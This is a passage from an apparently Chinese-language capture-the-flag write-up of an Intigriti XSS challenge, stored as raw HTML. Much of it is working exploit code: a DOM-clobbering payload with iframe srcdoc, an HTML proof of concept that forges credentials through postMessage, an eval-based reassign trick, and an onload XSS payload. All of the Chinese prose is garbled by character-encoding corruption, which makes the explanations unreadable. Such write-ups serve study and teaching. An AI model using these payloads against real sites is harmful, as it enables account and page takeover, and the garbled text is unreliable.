class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// do nothing if unauthorized</span><br>        <span class=\"token punctuation\">}</span><br>        <span class=\"token comment\">// ...</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token comment\">// hide this script on production</span><br>    document<span class=\"token punctuation\">.</span>currentScript<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p><code>top.DEV</code> è¦æ˜¯ truthyï¼Œç„¶å¾Œå‚³é€²å»çš„ credentials è¦ç¬¦åˆ <code>top.store.users.admin.username</code> é‚„æœ‰ <code>top.store.users.admin.password</code></p>\n<p>é€™æ¨£æˆ‘æ‡‰è©²è‡ªå·±å¯«ä¸€å€‹é é¢ï¼Œç„¶å¾Œè¨­ç½®ä¸€ä¸‹é€™äº›å…¨åŸŸè®Šæ•¸å°±å¥½äº†ï¼Ÿ</p>\n<p>æ²’è¾¦æ³•ï¼Œå› ç‚ºæœ‰ Same Origin Policy çš„å­˜åœ¨ï¼Œä½ åªèƒ½å­˜å–åŒæºé é¢ä¸‹çš„ window å…§å®¹ï¼Œæ‰€ä»¥å¦‚æœæ˜¯è‡ªå·±å¯«ä¸€å€‹é é¢ç„¶å¾ŒæŠŠ console.php embed åœ¨è£¡é¢çš„è©±ï¼Œåœ¨å­˜å– <code>top.DEV</code> æ™‚å°±æœƒå‡ºéŒ¯ã€‚</p>\n<p>æ‰€ä»¥æˆ‘å€‘éœ€è¦æœ‰ä¸€å€‹åŒæºçš„é é¢å¯ä»¥è®“æˆ‘å€‘è¨­ç½®ä¸€äº›æ±è¥¿ã€‚è€Œé€™å€‹é é¢ï¼Œé¡¯ç„¶å°±æ˜¯å¯ä»¥è®“æˆ‘å€‘æ’å…¥ä¸€äº› HTML çš„ htmledit.php äº†ã€‚</p>\n<h2 id=\"dom-clobbering\"><a class=\"direct-link\" href=\"#dom-clobbering\">#</a> DOM clobbering</h2>\n<p>è©²æ€éº¼åœ¨ä¸èƒ½åŸ·è¡Œ JS çš„æƒ…æ³ä¸‹è¨­ç½®å…¨åŸŸè®Šæ•¸å‘¢ï¼Ÿæ²’éŒ¯ï¼Œå°±æ˜¯ DOM clobberingã€‚</p>\n<p>èˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœä½ æœ‰å€‹ <code>&lt;div id=&quot;a&quot;&gt;&lt;/div&gt;</code>ï¼Œåœ¨ JS è£¡é¢ä½ å°±å¯ä»¥ç”¨ <code>window.a</code> æˆ–æ˜¯ <code>a</code> å»å­˜å–åˆ°é€™å€‹ div çš„ DOMã€‚</p>\n<p>å¦‚æœä½ å° DOM clobbering ä¸ç†Ÿçš„è©±å¯ä»¥åƒè€ƒæˆ‘ä¹‹å‰å¯«éçš„<a href=\"https://blog.huli.tw/2021/01/23/dom-clobbering/\">æ·ºè«‡ DOM Clobbering çš„åŸç†åŠæ‡‰ç”¨</a>ï¼Œæˆ–æ˜¯é€™ä¸€ç¯‡ä¹Ÿå¯«å¾—å¾ˆå¥½ï¼š<a href=\"https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/\">ä½¿ç”¨ Dom Clobbering æ‰©å±• XSS</a></p>\n<p>å¦‚æœè¦é”æˆå¤šå±¤çš„è®Šæ•¸è¨­ç½®ï¼Œå°±è¦åˆ©ç”¨åˆ° <code>iframe</code> æ­é… <code>srcdoc</code>ï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>DEV<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>store<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">srcdoc</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span><br>    &lt;a id=<span class=\"token punctuation\">\"</span>users<span class=\"token punctuation\">\"</span>>&lt;/a><br>    &lt;a id=<span class=\"token punctuation\">\"</span>users<span class=\"token punctuation\">\"</span> name=<span class=\"token punctuation\">\"</span>admin<span class=\"token punctuation\">\"</span> href=<span class=\"token punctuation\">\"</span>ftp://a:a@a<span class=\"token punctuation\">\"</span>>&lt;/a><br>    <span class=\"token punctuation\">'</span></span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>iframe</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>iframeConsole<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://challenge-0721.intigriti.io/console.php<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>iframe</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>é€™é‚Šé‚„æœ‰åˆ©ç”¨åˆ°ä¸€å€‹ç‰¹æ€§æ˜¯ a å…ƒç´ çš„ username å±¬æ€§æœƒæ˜¯ href å±¬æ€§è£¡ URL çš„ usernameã€‚</p>\n<p>é€™æ¨£è¨­ç½®çš„è©±ï¼Œ<code>top.DEV</code> å°±æœƒæ˜¯ <code>a id=&quot;DEV&quot;&gt;&lt;/a&gt;</code> é€™å€‹ DOMï¼Œè€Œ <code>store.users</code> å°±æœƒæ˜¯ HTMLCollectionï¼Œ<code>store.users.admin</code> æ˜¯é‚£å€‹ aï¼Œ<code>store.users.admin.username</code> å‰‡æœƒæ˜¯ href è£¡é¢çš„ usernameï¼Œä¹Ÿå°±æ˜¯ <code>a</code>ï¼Œè€Œå¯†ç¢¼ä¹Ÿæ˜¯ä¸€æ¨£çš„ã€‚</p>\n<p>ç¶œåˆä»¥ä¸Šæ‰€è¿°ï¼Œæˆ‘å¯ä»¥è‡ªå·±å¯«ä¸€å€‹ HTML ç„¶å¾Œç”¨ <code>window.open</code> å»é–‹å•Ÿ htmledit.php ç„¶å¾ŒæŠŠä¸Šé¢çš„å…§å®¹å¸¶é€²å»ï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><br><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>XSS POC<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>  <br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>    <span class=\"token keyword\">const</span> htmlUrl <span class=\"token operator\">=</span> <span class=\"token string\">'https://challenge-0721.intigriti.io/htmledit.php?code='</span><br>    <span class=\"token keyword\">const</span> payload <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\"><br>      &lt;a id=\"DEV\">&lt;/a><br>      &lt;iframe name=\"store\" srcdoc='<br>        &lt;a id=\"users\">&lt;/a><br>        &lt;a id=\"users\" name=\"admin\" href=\"ftp://a:a@a\">&lt;/a><br>      '>&lt;/iframe><br>      &lt;iframe name=\"iframeConsole\" src=\"https://challenge-0721.intigriti.io/console.php\">&lt;/iframe><br>    </span><span class=\"token template-punctuation string\">`</span></span><br><br>    <span class=\"token keyword\">var</span> win <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span>htmlUrl <span class=\"token operator\">+</span> <span class=\"token function\">encodeURIComponent</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br>    <span class=\"token comment\">// wait unitl window loaded</span><br>    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'go'</span><span class=\"token punctuation\">)</span><br>      <span class=\"token keyword\">const</span> credentials <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>        username<span class=\"token operator\">:</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span><br>        password<span class=\"token operator\">:</span> <span class=\"token string\">'a'</span><br>      <span class=\"token punctuation\">}</span><br>      win<span class=\"token punctuation\">.</span>frames<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>        cmd<span class=\"token operator\">:</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">,</span><br>        credentials<br>      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5000</span><span class=\"token punctuation\">)</span><br><br>  </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>å¦‚æ­¤ä¸€ä¾†ï¼Œæˆ‘å°±å¯ä»¥ç”¨ postMessage é€è¨Šæ¯é€²å»äº†ã€‚</p>\n<p>é›–ç„¶èŠ±äº†ä¸€ç•ªåŠŸå¤«ï¼Œä½†é€™æ‰åªæ˜¯é–‹å§‹è€Œå·²ã€‚</p>\n<h2 id=\"%E7%AC%AC%E4%BA%8C%E9%97%9C%EF%BC%9A%E8%AE%93-safe-%E8%AE%8A%E6%88%90-true\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%BA%8C%E9%97%9C%EF%BC%9A%E8%AE%93-safe-%E8%AE%8A%E6%88%90-true\">#</a> ç¬¬äºŒé—œï¼šè®“ safe è®Šæˆ true</h2>\n<p>safe è¦æ˜¯ trueï¼Œé€™æ¨£å‘¼å« log çš„æ™‚å€™æ‰ä¸æœƒæŠŠ <code>&lt;</code> escapeï¼Œè¦è®“ safe æ˜¯ true çš„è©±ï¼Œè¦æ‰¾åˆ°æœ‰å‚³å…¥å››å€‹åƒæ•¸çš„å‘¼å«ï¼Œå› ç‚ºç¬¬å››å€‹æœƒæ˜¯ safe çš„å€¼ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">case</span> <span class=\"token string\">\"logv\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// display variable's value by its name</span><br>    <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[logv]: \"</span><span class=\"token punctuation\">,</span> window<span class=\"token punctuation\">[</span>m<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> safe<span class=\"token operator\">=</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'info'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <br>    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span><br><span class=\"token keyword\">case</span> <span class=\"token string\">\"compare\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// compare variable's value to a given one</span><br>    <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[compare]: \"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>window<span class=\"token punctuation\">[</span>m<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">.</span>variable<span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> m<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> safe<span class=\"token operator\">=</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'info'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <br>    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p><code>log(&quot;[logv]: &quot;, window[m.message], safe=false, type='info')</code> é€™å€‹æˆ‘åœ¨æ‰¾çš„ function callï¼Œè€Œé€™ä¹‹ä¸­ç¬¬äºŒå€‹åƒæ•¸æœƒæ˜¯ <code>window[m.message]</code>ï¼Œä¹Ÿå°±æ˜¯èªªå¯ä»¥æŠŠä»»ä¸€å…¨åŸŸè®Šæ•¸ç•¶ä½œ data å‚³é€²å»ï¼Œå¯æ˜¯è¦å‚³ä»€éº¼å‘¢ï¼Ÿ</p>\n<h2 id=\"%E7%AC%AC%E4%B8%89%E9%97%9C%EF%BC%9A%E6%89%BE%E5%88%B0%E5%8F%AF%E4%BB%A5%E5%82%B3%E5%85%A5%E7%9A%84%E8%AE%8A%E6%95%B8\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%89%E9%97%9C%EF%BC%9A%E6%89%BE%E5%88%B0%E5%8F%AF%E4%BB%A5%E5%82%B3%E5%85%A5%E7%9A%84%E8%AE%8A%E6%95%B8\">#</a> ç¬¬ä¸‰é—œï¼šæ‰¾åˆ°å¯ä»¥å‚³å…¥çš„è®Šæ•¸</h2>\n<p>æˆ‘åœ¨é€™é‚Šå¡å¾—æ»¿ä¹…çš„ï¼Œå› ç‚ºæˆ‘æƒ³ä¸å¤ªåˆ°é€™é‚Šå¯ä»¥å‚³ä»€éº¼ã€‚ä»¥å‰æœ‰ä¸€æ‹›æ˜¯å¯ä»¥å‚³ nameï¼Œä½†æ˜¯é€™å€‹ç¶²é å·²ç¶“è‡ªå·±è¨­å®š name äº†æ‰€ä»¥æ²’è¾¦æ³•ã€‚å¦ä¸€æ‹›æ˜¯ç”¨ URL å»å‚³å°±å¯ä»¥æŠŠæ±è¥¿æ”¾åœ¨ location ä¸Šé¢ï¼Œä½† <code>log</code> è£¡é¢æœƒæª¢æŸ¥ <code>data</code> æ˜¯ä¸æ˜¯å­—ä¸²ï¼Œä¸æ˜¯çš„è©±è¦å…ˆç¶“é <code>JSON.stringify</code>ï¼ŒæœƒæŠŠå…§å®¹encodeã€‚</p>\n<p>å¡å¾ˆä¹…çš„æˆ‘åªå¥½ä¸æ–·é‡è¤‡çœ‹è‘—ç¨‹å¼ç¢¼ï¼Œçœ‹èƒ½ä¸èƒ½æ‰¾å‡ºä»€éº¼æ–°æ±è¥¿ï¼Œçµæœé‚„çœŸçš„æ‰¾åˆ°äº†ã€‚ä¸‹é¢é€™æ®µ code æœ‰ä¸€å€‹æ–°æ‰‹å¸¸è¦‹å•é¡Œï¼Œä½ æœ‰çœ‹å‡ºä¾†å—ï¼Ÿ</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> <span class=\"token function-variable function\">checkCredentials</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">username<span class=\"token punctuation\">,</span> password</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">let</span> users <span class=\"token operator\">=</span> top<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">.</span>users<span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">let</span> access <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>users<span class=\"token punctuation\">.</span>admin<span class=\"token punctuation\">,</span> users<span class=\"token punctuation\">.</span>moderator<span class=\"token punctuation\">,</span> users<span class=\"token punctuation\">.</span>manager<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>users <span class=\"token operator\">||</span> <span class=\"token operator\">!</span>password<span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>x <span class=\"token keyword\">of</span> access<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">.</span>username <span class=\"token operator\">===</span> username <span class=\"token operator\">&amp;&amp;</span> x<span class=\"token punctuation\">.</span>password <span class=\"token operator\">===</span> password<span class=\"token punctuation\">)</span><br>                <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>é€™å€‹å•é¡Œå°±å‡ºåœ¨ <code>for (x of access) {</code>ï¼Œx å¿˜äº†å®£å‘Šï¼Œæ‰€ä»¥é è¨­å°±æœƒè®Šæˆå…¨åŸŸè®Šæ•¸ã€‚åœ¨é€™é‚Šçš„è©±ï¼Œ<code>x</code> æœƒæ˜¯ <code>top.store.users.admin</code>ï¼Œä¹Ÿå°±æ˜¯æˆ‘å€‘è‡ªå·±è¨­ç½®çš„é‚£å€‹ <code>&lt;a&gt;</code>ã€‚</p>\n<h2 id=\"%E7%AC%AC%E5%9B%9B%E9%97%9C%EF%BC%9A%E7%B9%9E%E9%81%8E%E5%9E%8B%E6%85%8B%E6%AA%A2%E6%9F%A5\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E5%9B%9B%E9%97%9C%EF%BC%9A%E7%B9%9E%E9%81%8E%E5%9E%8B%E6%85%8B%E6%AA%A2%E6%9F%A5\">#</a> ç¬¬å››é—œï¼šç¹éå‹æ…‹æª¢æŸ¥</h2>\n<p>æ—¢ç„¶æˆ‘å€‘æœ‰äº†é€™å€‹ xï¼Œå°±å¯ä»¥æŠŠå®ƒç”¨ logv é€™å€‹ command å‚³å…¥ log functionï¼Œç„¶å¾Œå› ç‚º safe æœƒæ˜¯ trueï¼Œæ‰€ä»¥å°±å¯ä»¥ç›´æ¥æŠŠ x çš„å…§å®¹ç”¨ innerHTML é¡¯ç¤ºå‡ºä¾†ã€‚</p>\n<p>å¦‚æœä½ æŠŠä¸€å€‹ a å…ƒç´ è®Šæˆå­—ä¸²ï¼Œæœƒå¾—åˆ° a.href çš„å…§å®¹ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥æŠŠæˆ‘å€‘çš„ payload æ”¾åœ¨ href è£¡é¢ã€‚</p>\n<p>ä½†æ˜¯ï¼Œ<code>log</code> è£¡é¢æœƒæª¢æŸ¥ data çš„å‹æ…‹ï¼Œè€Œ <code>a</code> ä¸æ˜¯å­—ä¸²æ‰€ä»¥éä¸äº†æª¢æŸ¥ï¼Œé€™è©²æ€éº¼è¾¦å‘¢ï¼Ÿ</p>\n<p>é€™æ™‚å€™æˆ‘é‡æ–°çœ‹äº†ä¸€éç¨‹å¼ç¢¼ï¼Œç™¼ç¾äº†é€™å€‹æŒ‡ä»¤ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">case</span> <span class=\"token string\">\"reassign\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// change variable's value</span><br>    <span class=\"token keyword\">let</span> o <span class=\"token operator\">=</span> m<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">let</span> RegExp <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">^[s-zA-Z-+0-9]+$</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>RegExp<span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span>RegExp<span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Invalid input given!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br>        <span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>a<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>b<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[reassign]: \"</span><span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Value of \"</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>a<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">\" was changed to \"</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>b<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">\"</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'warn'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[reassign]: \"</span><span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Error changing value (</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>err<span class=\"token punctuation\">.</span>message<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">)</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'err'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>æˆ‘å¯ä»¥é€™æ¨£åšï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\">win<span class=\"token punctuation\">.</span>frames<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>    cmd<span class=\"token operator\">:</span> <span class=\"token string\">'reassign'</span><span class=\"token punctuation\">,</span><br>    message<span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><br>      a<span class=\"token operator\">:</span> <span class=\"token string\">'Z'</span><span class=\"token punctuation\">,</span><br>      b<span class=\"token operator\">:</span> <span class=\"token string\">'x+1'</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br>    credentials<br><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span></code></pre>\n<p>é€™å°±ç­‰æ–¼æ˜¯ <code>Z=x+1</code>ï¼Œç„¶å¾Œ <code>x+1</code> çš„æ™‚å€™æœƒå› ç‚ºè‡ªå‹•è½‰å‹çš„é—œä¿‚è®Šæˆå­—ä¸²ï¼Œé€™æ¨£ä¸€ä¾† Z å°±æœƒæ˜¯ä¸€å€‹å«æœ‰æˆ‘å€‘ payload çš„å­—ä¸²äº†ã€‚</p>\n<h2 id=\"%E7%AC%AC%E4%BA%94%E9%97%9C%EF%BC%9A%E7%B9%9E%E9%81%8E-encode\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%BA%94%E9%97%9C%EF%BC%9A%E7%B9%9E%E9%81%8E-encode\">#</a> ç¬¬äº”é—œï¼šç¹é encode</h2>\n<p>é›–ç„¶æˆ‘å€‘ç¾åœ¨å¯ä»¥å‚³å­—ä¸²é€²å»äº†ï¼Œä½†é‚„æœ‰ä¸€ä»¶äº‹æƒ…è¦æå®šï¼Œé‚£å°±æ˜¯å› ç‚º href è£¡é¢çš„æ±è¥¿æ˜¯ URL æ‰€ä»¥æœƒè¢« encodeï¼Œä¾‹å¦‚èªª <code>&lt;</code> æœƒè®Šæˆ <code>%3C</code>ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> a <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><br>a<span class=\"token punctuation\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">'href'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'ftp://a:a@a#&lt;img src=x onload=alert(1)>'</span><span class=\"token punctuation\">)</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>a<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><br><span class=\"token comment\">// ftp://a:a@a/#%3Cimg%20src=x%20onload=alert(1)%3E1</span></code></pre>\n<p>é€™åˆè¦æ€éº¼è¾¦å‘¢ï¼Ÿ</p>\n<p>åœ¨ <code>log</code> è£¡é¢æœ‰ä¸€è¡Œæ˜¯ <code>data = parse(data)</code>ï¼Œè€Œ parse çš„ç¨‹å¼ç¢¼æ˜¯é€™æ¨£çš„ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> <span class=\"token function-variable function\">parse</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> e <span class=\"token operator\">===</span> <span class=\"token string\">'string'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">s</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token 